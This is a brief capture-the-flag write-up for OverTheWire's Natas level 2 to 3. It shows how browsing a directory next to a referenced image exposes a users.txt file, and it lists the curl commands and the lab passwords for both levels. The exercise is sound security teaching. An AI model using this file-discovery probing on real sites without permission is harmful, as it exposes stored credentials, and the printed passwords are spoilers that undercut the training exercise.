# Natas Level 02 to 03

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 2 -> 3 |
| Status | Complete |

## Objective

Find the hidden file referenced by the page.

## Given Access

User: `natas2`

Password:

```text
TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```

## Method

The page includes `files/pixel.png`. Listing the adjacent `files/users.txt` file reveals credentials.

## Commands

```bash
curl -s -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/
curl -s -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt
```

## Result

Password for `natas3`:

```text
3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

## Lesson

Static asset paths often expose nearby files and directories worth checking.

## References

- https://overthewire.org/wargames/natas/
